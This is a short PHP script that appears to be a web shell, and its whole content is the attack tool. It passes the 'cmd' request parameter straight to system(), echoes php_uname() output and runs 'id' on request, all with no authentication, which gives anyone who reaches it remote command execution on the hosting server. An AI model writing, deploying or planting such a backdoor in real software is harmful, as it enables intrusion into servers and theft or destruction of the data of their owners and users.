<?php
  if (isset($_REQUEST['cmd'])) { system($_REQUEST['cmd']); }
  if (isset($_REQUEST['OS'])) { echo php_uname(); }
  if (isset($_REQUEST['ID'])) { system('id'); }
?>
